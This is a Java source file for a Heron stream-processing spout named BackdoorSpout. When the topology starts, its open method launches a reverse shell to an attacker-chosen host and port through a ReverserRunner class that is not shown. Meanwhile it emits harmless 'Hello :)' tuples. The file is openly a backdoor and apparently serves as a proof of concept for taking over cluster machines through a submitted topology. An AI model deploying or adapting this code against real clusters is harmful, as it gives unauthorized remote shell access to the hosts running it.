/**
 * Created by TAISHI on 8/5/16.
 */
import java.net.Inet4Address;
import java.util.Map;

import com.twitter.heron.api.spout.BaseRichSpout;
import com.twitter.heron.api.spout.SpoutOutputCollector;
import com.twitter.heron.api.topology.OutputFieldsDeclarer;
import com.twitter.heron.api.topology.TopologyContext;
import com.twitter.heron.api.tuple.Fields;
import com.twitter.heron.api.tuple.Values;

public class BackdoorSpout extends BaseRichSpout {
  private final Inet4Address lhost;
  private final int lport;
  private SpoutOutputCollector collector;

  /**
   * @param lhost: local host address to reverse to
   * @param lport: local port
   */
  public BackdoorSpout(Inet4Address lhost, int lport) {
    this.lhost = lhost;
    this.lport = lport;
  }

  public void open(Map<String, Object> map,
                   TopologyContext topologyContext,
                   SpoutOutputCollector spoutOutputCollector) {
    try {
      System.out.printf("Start a reverse shell to: %s:%d ", lhost.toString(), lport);
      new ReverserRunner(lhost, lport);
    } catch (Exception e) {
      e.printStackTrace();
    }

    this.collector = spoutOutputCollector;
  }

  public void nextTuple() {
    collector.emit(new Values("Hello :)"));
  }

  public void declareOutputFields(OutputFieldsDeclarer outputFieldsDeclarer) {
    outputFieldsDeclarer.declare(new Fields("hello"));
  }
}
